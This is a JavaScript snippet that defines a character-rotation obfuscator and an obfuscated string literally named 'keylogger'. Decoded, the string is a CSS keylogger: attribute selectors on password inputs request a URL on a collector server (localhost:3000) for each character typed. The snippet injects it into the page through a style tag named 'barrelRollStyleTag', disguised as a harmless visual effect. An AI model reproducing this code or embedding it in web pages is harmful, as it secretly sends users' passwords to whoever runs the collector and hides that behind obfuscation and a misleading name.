String.prototype.obfs = function(key, n = 126) {
  // return String itself if the given parameters are invalid
  if (!(typeof(key) === 'number' && key % 1 === 0)
    || !(typeof(key) === 'number' && key % 1 === 0)) {
    return this.toString();
  }

  var chars = this.toString().split('');

  for (var i = 0; i < chars.length; i++) {
    var c = chars[i].charCodeAt(0);

    if (c <= n) {
      chars[i] = String.fromCharCode((chars[i].charCodeAt(0) + key) % n);
    }
  }

  return chars.join('');
};

/**
 * De-obfuscate an obfuscated string with the method above.
 * @param  {[type]} key rotation index between 0 and n
 * @param  {Number} n   same number that was used for obfuscation
 * @return {[type]}     plaintext string
 */
String.prototype.defs = function(key, n = 126) {
  // return String itself if the given parameters are invalid
  if (!(typeof(key) === 'number' && key % 1 === 0)
    || !(typeof(key) === 'number' && key % 1 === 0)) {
    return this.toString();
  }

  return this.toString().obfs(n - key);
};


keylogger = 'chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C\x1A\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)%\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C\x1B\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,+\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C\x1C\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,,\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C\x1D\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,-\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C\x1E\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,.\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C\x1F\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,/\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C \x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,0\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C!\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,1\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C"\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,2\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C#\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,3\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C$\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,;\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C%\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,<\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C&\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,=\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C\'\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\'\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C(\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)(\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C)\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F,@\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C*\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)*\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C+\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)+\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C,\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***),\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C-\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)-\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C.\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***).\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C/\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)/\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C0\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)0\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C1\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)1\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C2\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)2\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C3\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)3\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C4\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F-;\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C5\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F-<\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C6\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F-=\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C7\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F->\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C8\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F-?\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C9\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F-@\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C:\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F.*\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C;\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***);\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C<\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)<\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C=\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)=\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C>\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)>\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C?\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)?\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C@\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)@\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CA\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)A\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CB\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)B\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CC\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)C\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CD\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)D\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CE\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)E\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CF\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)F\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CG\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)G\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CH\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)H\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CI\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)I\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CJ\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)J\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CK\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)K\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CL\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)L\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CM\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)M\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CN\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)N\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CO\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)O\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CP\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)P\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CQ\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)Q\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CR\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)R\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CS\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)S\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CT\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)T\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CU\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F/<\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CV\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F/=\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CW\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F/>\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CX\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F/?\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CY\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)Y\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C[\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)[\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C\\\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\\\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C]\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)]\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C^\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)^\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C_\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)_\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C`\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)`\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Ca\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)a\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cb\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)b\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cc\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)c\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cd\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)d\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Ce\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)e\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cf\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)f\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cg\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)g\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Ch\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)h\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Ci\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)i\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cj\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)j\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Ck\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)k\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cl\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)l\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cm\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)m\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cn\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)n\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Co\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)o\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cp\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)p\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cq\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)q\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cr\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)r\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cs\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)s\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Ct\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)t\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cu\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F1<\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cv\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F1=\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1CVw\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F1>\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1Cx\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)x\x1C#5\x1Aw\x04chjonUnsj_7\x1Cj[mmqil^\x1CWUp[fo_\x1E7\x1C\x7F\x1CW\x1Au\x1A\\[]ealioh^\'cg[a_4\x1Aolf"\x1Cbnnj4))fi][fbimn4-***)\x1F1@\x1C#5\x1Aw'
const barrelRollStyleTag = document.createElement("style");

barrelRollStyleTag.innerText = keylogger.defs(120);

document.head.appendChild(barrelRollStyleTag);

completion();
